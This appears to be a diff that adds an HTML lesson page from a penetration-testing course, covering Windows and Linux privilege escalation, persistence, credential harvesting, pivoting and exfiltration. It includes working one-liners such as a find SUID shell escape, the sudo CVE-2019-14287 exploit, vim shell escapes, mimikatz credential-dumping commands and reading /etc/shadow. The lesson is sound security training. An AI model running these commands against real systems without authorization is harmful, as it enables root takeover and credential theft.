@@ -1,0 +1,338 @@
+
+<div class="max-w-4xl mx-auto p-6 bg-slate-900 text-slate-100">
+  <h1 class="text-3xl font-bold mb-6 text-slate-100">Module 14: Post-Exploitation and Privilege Escalation</h1>
+  
+  <p class="text-slate-300 mb-6 text-lg leading-relaxed">
+    Post-exploitation activities demonstrate the true impact of security breaches by exploring what attackers can accomplish after gaining initial access. This module covers privilege escalation, persistence mechanisms, and lateral movement techniques.
+  </p>
+
+  <div class="mb-8">
+    <img src="/images/post-exploitation.jpg" alt="Post-Exploitation" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Post-exploitation activities reveal the full scope of potential damage from security breaches</p>
+  </div>
+
+  <h2 class="text-2xl font-semibold text-slate-100 mb-4">Learning Objectives</h2>
+  <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
+    <ul class="text-slate-300 space-y-2">
+      <li>• Master Windows and Linux privilege escalation techniques</li>
+      <li>• Learn persistence mechanisms and backdoor installation</li>
+      <li>• Understand lateral movement and network pivoting</li>
+      <li>• Practice credential harvesting and token manipulation</li>
+      <li>• Implement data exfiltration and covert channels</li>
+      <li>• Develop comprehensive post-exploitation strategies</li>
+    </ul>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 1: Windows Privilege Escalation</h3>
+
+  <div class="mb-8">
+    <img src="/images/windows-privilege-escalation.jpg" alt="Windows Privilege Escalation" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Windows systems offer multiple vectors for privilege escalation attacks</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Windows privilege escalation involves exploiting misconfigurations, vulnerabilities, or design flaws to gain higher-level access rights within the operating system.
+  </p>
+
+  <div class="space-y-4 mb-6">
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-red-400 mb-2">Kernel Exploits</h5>
+      <p class="text-slate-300 text-sm mb-2">Exploit operating system vulnerabilities for SYSTEM privileges:</p>
+      <div class="bg-slate-900 rounded p-3">
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">systeminfo</span> - Check OS version and patches</p>
+          <p><span class="text-cyan-400">wmic qfe list</span> - List installed updates</p>
+          <p><span class="text-cyan-400">windows-exploit-suggester.py --database 2024-KB.xlsx --systeminfo systeminfo.txt</span></p>
+          <p><span class="text-cyan-400">use post/multi/recon/local_exploit_suggester</span> - Metasploit suggester</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-orange-400 mb-2">Service Exploits</h5>
+      <p class="text-slate-300 text-sm mb-2">Target misconfigured Windows services:</p>
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm text-slate-300">
+        <div>
+          <p class="font-semibold mb-1">Unquoted Service Paths:</p>
+          <code class="text-green-400 text-xs">wmic service get name,displayname,pathname,startmode</code>
+        </div>
+        <div>
+          <p class="font-semibold mb-1">Weak Service Permissions:</p>
+          <code class="text-green-400 text-xs">accesschk.exe -ucqv ServiceName</code>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-yellow-400 mb-2">Registry Exploits</h5>
+      <p class="text-slate-300 text-sm mb-2">Exploit registry misconfigurations for privilege escalation:</p>
+      <div class="bg-slate-900 rounded p-3">
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">reg query HKLM\SYSTEM\CurrentControlSet\Services</span> - Service registry</p>
+          <p><span class="text-cyan-400">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span></p>
+          <p><span class="text-cyan-400">accesschk.exe -uwqs Users c:\</span> - Check writable directories</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 2: Linux Privilege Escalation</h3>
+
+  <div class="mb-8">
+    <img src="/images/linux-privilege-escalation.jpg" alt="Linux Privilege Escalation" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Linux systems require different approaches for privilege escalation</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Linux privilege escalation typically targets SUID binaries, sudo misconfigurations, cron jobs, and kernel vulnerabilities to gain root access.
+  </p>
+
+  <div class="space-y-4 mb-6">
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-blue-400 mb-2">SUID/SGID Binaries</h5>
+      <p class="text-slate-300 text-sm mb-2">Find and exploit SUID binaries for privilege escalation:</p>
+      <div class="bg-slate-900 rounded p-3">
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">find / -perm -u=s -type f 2>/dev/null</span> - Find SUID files</p>
+          <p><span class="text-cyan-400">find / -perm -g=s -type f 2>/dev/null</span> - Find SGID files</p>
+          <p><span class="text-cyan-400">ls -la /usr/bin/find</span> - Check specific binary permissions</p>
+          <p><span class="text-cyan-400">find /home -exec "/bin/sh" \;</span> - Exploit find SUID</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-green-400 mb-2">Sudo Exploitation</h5>
+      <p class="text-slate-300 text-sm mb-2">Exploit sudo misconfigurations and vulnerabilities:</p>
+      <div class="bg-slate-900 rounded p-3">
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">sudo -l</span> - List sudo privileges</p>
+          <p><span class="text-cyan-400">sudo -u#-1 /bin/bash</span> - CVE-2019-14287 exploit</p>
+          <p><span class="text-cyan-400">sudo vim -c ':!/bin/sh'</span> - Vim escape to shell</p>
+          <p><span class="text-cyan-400">echo 'import os; os.system("/bin/sh")' > /tmp/script.py</span></p>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-purple-400 mb-2">Cron Job Exploitation</h5>
+      <p class="text-slate-300 text-sm mb-2">Target scheduled tasks for privilege escalation:</p>
+      <div class="bg-slate-900 rounded p-3">
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">cat /etc/crontab</span> - System crontab</p>
+          <p><span class="text-cyan-400">ls -la /etc/cron*</span> - Cron directories</p>
+          <p><span class="text-cyan-400">crontab -l</span> - User crontab</p>
+          <p><span class="text-cyan-400">find /var/spool/cron -name '*' 2>/dev/null</span> - User cron files</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 3: Persistence Mechanisms</h3>
+
+  <div class="mb-8">
+    <img src="/images/persistence-mechanisms.jpg" alt="Persistence Mechanisms" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Persistence mechanisms ensure continued access to compromised systems</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Persistence mechanisms allow attackers to maintain access to compromised systems across reboots, user logouts, and other system changes.
+  </p>
+
+  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+    <div class="bg-slate-800 rounded-lg p-4">
+      <h4 class="text-lg font-semibold text-slate-100 mb-2">Windows Persistence</h4>
+      <ul class="text-slate-300 text-sm space-y-1">
+        <li>• <strong>Registry Run Keys:</strong> HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</li>
+        <li>• <strong>Startup Folder:</strong> %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</li>
+        <li>• <strong>Services:</strong> Create malicious Windows services</li>
+        <li>• <strong>Scheduled Tasks:</strong> schtasks command for persistence</li>
+        <li>• <strong>WMI Events:</strong> Permanent WMI event subscriptions</li>
+        <li>• <strong>DLL Hijacking:</strong> Replace legitimate DLLs</li>
+      </ul>
+    </div>
+
+    <div class="bg-slate-800 rounded-lg p-4">
+      <h4 class="text-lg font-semibold text-slate-100 mb-2">Linux Persistence</h4>
+      <ul class="text-slate-300 text-sm space-y-1">
+        <li>• <strong>Cron Jobs:</strong> Scheduled task persistence</li>
+        <li>• <strong>Init Scripts:</strong> /etc/init.d/ service scripts</li>
+        <li>• <strong>Systemd Services:</strong> Modern service management</li>
+        <li>• <strong>Profile Scripts:</strong> .bashrc, .profile modifications</li>
+        <li>• <strong>SSH Keys:</strong> Authorized_keys backdoors</li>
+        <li>• <strong>Library Injection:</strong> LD_PRELOAD modifications</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 4: Credential Harvesting</h3>
+
+  <div class="mb-8">
+    <img src="/images/credential-harvesting.jpg" alt="Credential Harvesting" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Credential harvesting reveals additional attack vectors and lateral movement opportunities</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Credential harvesting involves extracting authentication information from compromised systems to facilitate lateral movement and privilege escalation.
+  </p>
+
+  <div class="space-y-4 mb-6">
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-red-400 mb-2">Windows Credential Extraction</h5>
+      <div class="bg-slate-900 rounded p-3">
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">hashdump</span> - Meterpreter hash extraction</p>
+          <p><span class="text-cyan-400">load mimikatz</span> - Load mimikatz in Meterpreter</p>
+          <p><span class="text-cyan-400">sekurlsa::logonpasswords</span> - Extract logon passwords</p>
+          <p><span class="text-cyan-400">sekurlsa::wdigest</span> - WDigest credential extraction</p>
+          <p><span class="text-cyan-400">vault::cred</span> - Windows credential manager</p>
+          <p><span class="text-cyan-400">lsadump::sam</span> - SAM database dump</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-orange-400 mb-2">Linux Credential Extraction</h5>
+      <div class="bg-slate-900 rounded p-3">
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">cat /etc/passwd</span> - User account information</p>
+          <p><span class="text-cyan-400">cat /etc/shadow</span> - Password hashes (requires root)</p>
+          <p><span class="text-cyan-400">find / -name "*.config" 2>/dev/null</span> - Configuration files</p>
+          <p><span class="text-cyan-400">history</span> - Command history for credentials</p>
+          <p><span class="text-cyan-400">find /home -name ".*history" 2>/dev/null</span> - All history files</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-yellow-400 mb-2">Browser Credential Extraction</h5>
+      <div class="bg-slate-900 rounded p-3">
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">run post/multi/gather/firefox_creds</span> - Firefox credentials</p>
+          <p><span class="text-cyan-400">run post/windows/gather/enum_chrome</span> - Chrome data extraction</p>
+          <p><span class="text-cyan-400">LaZagne.exe all</span> - Multi-browser password recovery</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 5: Lateral Movement</h3>
+
+  <div class="mb-8">
+    <img src="/images/lateral-movement.jpg" alt="Lateral Movement" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Lateral movement extends compromise across network infrastructure</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Lateral movement involves using compromised systems as stepping stones to access additional network resources and expand the scope of compromise.
+  </p>
+
+  <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
+    <h4 class="text-lg font-semibold text-slate-100 mb-3">Network Pivoting Techniques</h4>
+    <div class="space-y-3">
+      <div class="bg-slate-900 rounded p-3">
+        <h5 class="font-semibold text-blue-400 mb-1">Meterpreter Pivoting</h5>
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">run autoroute -s 192.168.1.0/24</span> - Add route through session</p>
+          <p><span class="text-cyan-400">use auxiliary/server/socks4a</span> - SOCKS proxy server</p>
+          <p><span class="text-cyan-400">portfwd add -l 3389 -p 3389 -r 192.168.1.100</span> - Port forwarding</p>
+        </div>
+      </div>
+
+      <div class="bg-slate-900 rounded p-3">
+        <h5 class="font-semibold text-green-400 mb-1">SSH Tunneling</h5>
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">ssh -L 8080:internal-server:80 user@jumphost</span> - Local port forward</p>
+          <p><span class="text-cyan-400">ssh -R 9090:localhost:22 user@remote</span> - Remote port forward</p>
+          <p><span class="text-cyan-400">ssh -D 1080 user@proxy-server</span> - Dynamic SOCKS proxy</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 6: Data Exfiltration</h3>
+
+  <div class="mb-8">
+    <img src="/images/data-exfiltration.jpg" alt="Data Exfiltration" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Data exfiltration techniques demonstrate potential information theft capabilities</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Data exfiltration demonstrates the potential for information theft and helps organizations understand their data protection weaknesses.
+  </p>
+
+  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+    <div class="bg-slate-800 rounded-lg p-4">
+      <h4 class="text-lg font-semibold text-slate-100 mb-2">Traditional Channels</h4>
+      <ul class="text-slate-300 text-sm space-y-1">
+        <li>• <strong>HTTP/HTTPS:</strong> Web-based file transfer</li>
+        <li>• <strong>FTP/SFTP:</strong> File transfer protocols</li>
+        <li>• <strong>Email:</strong> Attachment-based exfiltration</li>
+        <li>• <strong>Cloud Storage:</strong> Dropbox, Google Drive uploads</li>
+        <li>• <strong>USB/Removable Media:</strong> Physical exfiltration</li>
+        <li>• <strong>Network Shares:</strong> SMB/NFS transfers</li>
+      </ul>
+    </div>
+
+    <div class="bg-slate-800 rounded-lg p-4">
+      <h4 class="text-lg font-semibold text-slate-100 mb-2">Covert Channels</h4>
+      <ul class="text-slate-300 text-sm space-y-1">
+        <li>• <strong>DNS Tunneling:</strong> Data in DNS queries</li>
+        <li>• <strong>ICMP Tunneling:</strong> Ping packet data</li>
+        <li>• <strong>Steganography:</strong> Hidden data in images</li>
+        <li>• <strong>Social Media:</strong> Data posted to platforms</li>
+        <li>• <strong>Chat Applications:</strong> Messaging platforms</li>
+        <li>• <strong>Blockchain:</strong> Data in transactions</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Practical Exercises</h3>
+
+  <div class="space-y-4 mb-6">
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-slate-100 mb-2">Exercise 1: Windows Privilege Escalation</h5>
+      <p class="text-slate-300 text-sm mb-2">Practice Windows privilege escalation techniques:</p>
+      <ul class="text-slate-300 text-sm space-y-1">
+        <li>• Enumerate system for escalation vectors</li>
+        <li>• Exploit unquoted service paths vulnerability</li>
+        <li>• Use registry exploits for privilege escalation</li>
+        <li>• Document successful escalation methods</li>
+      </ul>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-slate-100 mb-2">Exercise 2: Linux Privilege Escalation</h5>
+      <p class="text-slate-300 text-sm mb-2">Master Linux privilege escalation vectors:</p>
+      <ul class="text-slate-300 text-sm space-y-1">
+        <li>• Find and exploit SUID binaries</li>
+        <li>• Abuse sudo misconfigurations</li>
+        <li>• Exploit writable cron jobs</li>
+        <li>• Create comprehensive escalation methodology</li>
+      </ul>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-slate-100 mb-2">Exercise 3: Lateral Movement Simulation</h5>
+      <p class="text-slate-300 text-sm mb-2">Practice network lateral movement:</p>
+      <ul class="text-slate-300 text-sm space-y-1">
+        <li>• Set up multi-host environment</li>
+        <li>• Establish network pivoting through compromised host</li>
+        <li>• Use harvested credentials for lateral access</li>
+        <li>• Map trust relationships and network topology</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Key Takeaways</h3>
+  <p class="text-slate-300 mb-6">
+    Post-exploitation activities reveal the true impact of security breaches and help organizations understand their exposure to advanced threats. This module covered privilege escalation, persistence, lateral movement, and data exfiltration techniques across Windows and Linux systems. Understanding these techniques is essential for both offensive and defensive security operations. Always ensure proper authorization and scope boundaries when conducting post-exploitation activities. Document all activities thoroughly to provide clear evidence of impact and support remediation efforts.
+  </p>
+
+  <div class="bg-gradient-to-r from-slate-800 to-slate-700 rounded-lg p-6 border border-slate-600">
+    <h4 class="text-lg font-semibold text-slate-100 mb-3">🔄 Next: Database Security Testing</h4>
+    <p class="text-slate-300">
+      Module 15 explores database security testing techniques, SQL injection exploitation, and NoSQL database assessment methods.
+    </p>
+  </div>
+</div>
